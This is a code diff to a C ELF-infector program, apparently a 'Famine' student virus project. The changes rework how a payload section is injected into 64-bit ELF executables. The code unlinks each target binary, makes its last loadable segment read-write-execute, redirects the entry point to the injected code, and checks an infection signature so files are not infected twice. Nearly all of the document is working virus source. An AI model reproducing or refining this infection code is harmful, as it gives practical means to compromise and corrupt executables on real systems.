@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2018/06/11 16:18:18 by root             ###   ########.fr       */
+/*   Updated: 2018/06/12 05:43:13 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,7 +28,6 @@
 #define MUNMAP		11
 #define UNLINK		87
 #define GETDENTS64	217
-
 
 void			find_files(char *dir);
 void			get_dat_elf(char *dir, char *file);
@@ -125,8 +124,8 @@ void	get_dat_elf(char *dir, char *file)
 void		pack_dat_elf(char *path, int size, char *data)
 {
 	if (data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F' &&
-		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
-		//!dat_elf_is_infected(data))
+		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3) &&
+		!dat_elf_is_infected(data))
 	{
 
 		/* 1. Find the last PT_LOAD segment */
@@ -141,41 +140,42 @@ void		pack_dat_elf(char *path, int size, char *data)
 		if (iprogram == NULL) /* Weird if its NULL */
 			return ;
 
-		/* 2. Find the last section */
-		size_t shoff = ((Elf64_Ehdr *)data)->e_shoff;
-		size_t shnum = ((Elf64_Ehdr *)data)->e_shnum;
-		size_t shentsize = ((Elf64_Ehdr *)data)->e_shentsize;
-		Elf64_Shdr *lsection = (Elf64_Shdr *)(data + shoff + (shnum - 1) * shentsize);
-
-		syscall(UNLINK, path); /* Erase the file from system tree */
+		/* 2. Find the last section of the last PT_LOAD */
+		size_t	shoff = ((Elf64_Ehdr *)data)->e_shoff;
+		Elf64_Shdr *section = (Elf64_Shdr *)(data + shoff);
+		Elf64_Shdr *isection = NULL;
+		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
+			if (section[i].sh_addr == iprogram->p_vaddr + iprogram->p_filesz) {
+				isection = &section[i];
+			}
+		}
+		if (isection == NULL) /* Weird if its NULL */
+			return ;
 
 		Elf64_Shdr newsect;
 		newsect.sh_name = 0;
 		newsect.sh_type = SHT_PROGBITS;
 		newsect.sh_flags = 0x6;
-		newsect.sh_addr = iprogram->p_vaddr - iprogram->p_offset + shoff;
-		newsect.sh_offset = shoff;
+		newsect.sh_addr = iprogram->p_vaddr + iprogram->p_filesz;
+		newsect.sh_offset = iprogram->p_offset + iprogram->p_filesz;
 		newsect.sh_size = famine64_size;
 		newsect.sh_link = 0;
 		newsect.sh_info = 0;
 		newsect.sh_addralign = 0x10;
 		newsect.sh_entsize = 0;
 
-		/* 4. Modify sections offset higher than where we will wrote our code */
-		/* Elf64_Shdr *section = (Elf64_Shdr *)(data + ((Elf64_Ehdr *)data)->e_shoff); */
-		/* Elf64_Shdr *isection = NULL; */
-		/* for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) { */
-		/* 	if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_filesz) { */
-		/* 		if (isection == NULL) { */
-		/* 			isection = &section[i]; */
-		/* 		} */
-		/* 		if (section[i].sh_addr >= iprogram->p_vaddr + iprogram->p_filesz) */
-		/* 			section[i].sh_addr += famine64_size; */
-		/* 		section[i].sh_offset += famine64_size; */
-		/* 	} */
-		/* } */
+		syscall(UNLINK, path); /* Erase the file from system tree */
 
-		/* 3. Change the elf header */
+		/* 3. Modify sections offset higher than where we will wrote our code */
+		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
+			if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_filesz) {
+				if (section[i].sh_addr >= iprogram->p_vaddr + iprogram->p_filesz)
+					section[i].sh_addr += famine64_size;
+				section[i].sh_offset += famine64_size;
+			}
+		}
+
+		/* 4. Change the elf header */
 		Elf64_Addr old_entry = ((Elf64_Ehdr *)data)->e_entry;
 		((Elf64_Ehdr *)data)->e_entry = newsect.sh_addr;
 		((Elf64_Ehdr *)data)->e_shoff += famine64_size;
@@ -186,11 +186,11 @@ void		pack_dat_elf(char *path, int size, char *data)
 		iprogram->p_flags |= PF_R;
 		iprogram->p_flags |= PF_W;
 		iprogram->p_flags |= PF_X;
-		iprogram->p_memsz += newsect.sh_offset + newsect.sh_size;
-		iprogram->p_filesz += newsect.sh_offset + newsect.sh_size;
+		iprogram->p_memsz += famine64_size;
+		iprogram->p_filesz += famine64_size;
 
 		/* Re-create the file */
-		/* Nicer way will be to get the file permissions and assign it like it was */
+		/* Nicer way will be to get the file permissions and assign 'em like it was */
 		int fd = syscall(OPEN, path, O_WRONLY|O_CREAT, 0755);
 		if (fd == -1) {
 			write(1, "OPEN file failed\n", 17);
@@ -198,7 +198,7 @@ void		pack_dat_elf(char *path, int size, char *data)
 		}
 
 		/* Re-write the file */
-		size_t off = ((Elf64_Ehdr *)data)->e_shoff - famine64_size;
+		size_t off = newsect.sh_offset;
 		printf("offset : %lx\n", off);
 		if (write(fd, data, off) < 0)
 			return ;
@@ -215,27 +215,13 @@ void		pack_dat_elf(char *path, int size, char *data)
 
 int		dat_elf_is_infected(char *data)
 {
-	Elf64_Phdr *segment = (Elf64_Phdr *)(data + ((Elf64_Ehdr *)data)->e_phoff);
-	Elf64_Phdr *isegment = NULL;
-	/* Find last PT_LOAD segment */
-	for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
-		if (segment[i].p_type == PT_LOAD) {
-			isegment = &segment[i];
-		}
-	}
-	if (isegment == NULL)
-		return (1);
-	char *ptr = (data + isegment->p_offset + isegment->p_filesz - 16);
-	/* Going at the end of the segment less 16 bit will point to the first 8 bits of our infection signature */
-	uint32_t sign = *(uint32_t*)ptr;
-	ptr = (data + isegment->p_offset + isegment->p_filesz - 12);
-	/* End less 12 bits point to the last 8 bits of our infection signature */
-	uint32_t sign4 = *(uint32_t*)ptr;
-	return (sign == 0x42CAFE42 && sign4 == 0x24EFAC24);
+	uint64_t signature = *(uint64_t *)(data + ((Elf64_Ehdr *)data)->e_shoff - 16);
+	if (((Elf64_Ehdr *)data)->e_ident[EI_DATA] == 1) // Little-endian
+		return (signature == 0x24EFAC2442CAFE42);
+	return (signature == 0x42CAFE4224EFAC24);
 }
 
 /*
-
 		typedef struct
 		{
 16			unsigned char e_ident[EI_NIDENT];
